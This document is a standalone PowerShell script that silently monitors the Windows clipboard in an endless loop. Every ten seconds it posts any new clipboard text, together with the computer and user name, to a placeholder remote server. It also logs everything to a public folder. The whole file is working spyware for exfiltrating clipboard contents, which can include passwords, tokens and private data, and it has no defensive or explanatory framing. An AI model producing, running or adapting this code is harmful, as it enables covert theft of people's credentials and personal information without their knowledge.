Add-Type -AssemblyName System.Windows.Forms

$webhook_url = "http://<YourServerIP>:5000/clipboard_receiver" 
$log_file = "C:\Users\Public\clipboard_log.txt"

function Log-Message {
    param (
        [string]$message
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path $log_file -Value "[$timestamp] $message"
}

function Send-ClipboardData {
    param (
        [string]$clipText
    )

    $postParams = @{
        clipboard_data = $clipText
        machine_name = $env:COMPUTERNAME
        user_name = $env:USERNAME
    }

    try {
        Invoke-RestMethod -Uri $webhook_url -Method Post -Body $postParams
        Log-Message "Data sent successfully: $clipText"
    } catch {
        Log-Message "Failed to send data: $_"
    }
}

Log-Message "Clipboard monitoring started"
$lastClipboardText = ""

while ($true) {
    try {
        $clipboardText = [System.Windows.Forms.Clipboard]::GetText()

        $clipboardText = $clipboardText -replace "`r`n", " " -replace "`n", " " -replace "`r", " "

        if ($clipboardText -and $clipboardText -ne $lastClipboardText) {
            $lastClipboardText = $clipboardText

            Log-Message "Clipboard: $clipboardText"

            Send-ClipboardData -clipText $clipboardText
        }
    } catch {
        Log-Message "Error accessing clipboard: $_"
    }

    Start-Sleep -Seconds 10
}
